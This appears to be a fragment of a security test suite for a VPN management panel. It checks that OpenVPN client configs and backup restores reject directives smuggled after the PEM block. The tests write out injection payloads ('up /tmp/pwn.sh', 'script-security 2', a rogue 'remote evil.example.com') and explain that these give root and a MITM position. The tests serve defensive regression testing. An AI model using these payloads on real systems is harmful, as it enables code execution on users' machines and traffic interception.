...
# ---------------------------------------------------------------- OpenVPN config integrity
# A crafted backup is a realistic social-engineering vector ("restore this file
# from the old server"). The client cert/key live inside secret_data and are
# interpolated into a line-oriented .ovpn, so anything after the PEM block used
# to become a DIRECTIVE: `up /tmp/pwn.sh` + `script-security 2` (root on the
# customer's machine), a second <ca> + rogue `remote` (full MITM).
try:
    ...
    import protocols as _proto

    _k = _rsa.generate_private_key(public_exponent=65537, key_size=2048)
    _n = _x509.Name([_x509.NameAttribute(_NameOID.COMMON_NAME, "probe")])
    _now = _dt.datetime.now(_dt.timezone.utc)
    _c = (
        _x509.CertificateBuilder().subject_name(_n).issuer_name(_n)
        .public_key(_k.public_key()).serial_number(_x509.random_serial_number())
        .not_valid_before(_now).not_valid_after(_now + _dt.timedelta(days=30))
        .sign(_k, _hashes.SHA256())
    )
    _cert_pem = _c.public_bytes(_ser.Encoding.PEM).decode()
    _key_pem = _k.private_bytes(_ser.Encoding.PEM, _ser.PrivateFormat.PKCS8,
                                _ser.NoEncryption()).decode()
    _good = f"<ZEFIRA-CERT>{_cert_pem}<ZEFIRA-KEY>{_key_pem}"
    _srv = {"domain": "vpn.example.com", "ovpn_port": 1194, "ovpn_proto": "udp"}
    ...
    for _label, _tail in (
        ...
        try:
            _out = _proto._ovpn_config({"username": "probe"}, _srv, _good + _tail)
            _leaked = any(t in _out for t in ("pwn.sh", "EVIL", "evil.example.com", "redirect-gateway"))
        except ValueError:
            _leaked = False
        check(f"the .ovpn renderer refuses an appended {_label}", not _leaked)
    _out = _proto._ovpn_config({"username": "probe"}, _srv, _good)
    check("a valid .ovpn still renders with one <ca> and one <key>",
          _out.count("<ca>") == 1 and _out.count("<key>") == 1
          and "remote vpn.example.com 1194" in _out, _out[:120])
    check("the .ovpn does not demand the CA name from the server certificate",
          "verify-x509-name" not in _out)
except ImportError:
    check("openvpn injection probe ran", False, "cryptography missing")
...
if bk:
    ...
    # A backup whose OpenVPN secret carries directives after the PEM block must
    # have that secret REGENERATED, not replayed into every .ovpn afterwards.
    st, uovpn = js("POST", "/api/users", {
        "username": "ov" + uuid.uuid4().hex[:8], "protocols": ["openvpn"],
        "volume_gb": 5, "days": 5}, AUTH)
    if uovpn.get("id"):
        created_users.append(uovpn["id"])
        st, _, bk2 = req("POST", "/api/backup", json.dumps({"password_confirm": PASSWORD}),
                         AUTH, timeout=40)
        try:
            bk2 = json.loads(bk2)
        except Exception:
            bk2 = {}
        victim = next((x for x in bk2.get("users", [])
                       if x.get("username") == uovpn["username"]), None)
        if victim and victim.get("secret_data"):
            sec = json.loads(victim["secret_data"]) if victim["secret_data"].startswith("{") else {}
            if sec.get("openvpn"):
                sec["openvpn"] += "\nup /tmp/pwn.sh\nscript-security 2\nremote evil.example.com 1194"
                victim["secret_data"] = json.dumps(sec)
                bk2["password_confirm"] = PASSWORD
                st, rr = js("POST", "/api/restore", bk2, AUTH, timeout=90)
                st, after2 = js("GET", f"/api/users?q={uovpn['username']}", headers=AUTH)
                row = next((x for x in after2.get("items", [])
                            if x["username"] == uovpn["username"]), None)
                check("a tampered OpenVPN secret is regenerated by the restore",
                      st == 200 and row is not None, f"{st} {str(rr)[:80]}")
                if row:
                    st, _, cfg2 = req("GET", f"/api/users/{row['id']}/config", headers=AUTH)
                    body2 = cfg2.decode("utf-8", "replace")
                    check("no injected directive reaches the generated .ovpn",
                          "pwn.sh" not in body2 and "evil.example.com" not in body2
                          and "script-security" not in body2, body2[:160])
                    check("the regenerated .ovpn is still valid",
                          "BEGIN CERTIFICATE" in body2 and "<ca>" in body2, body2[:120])
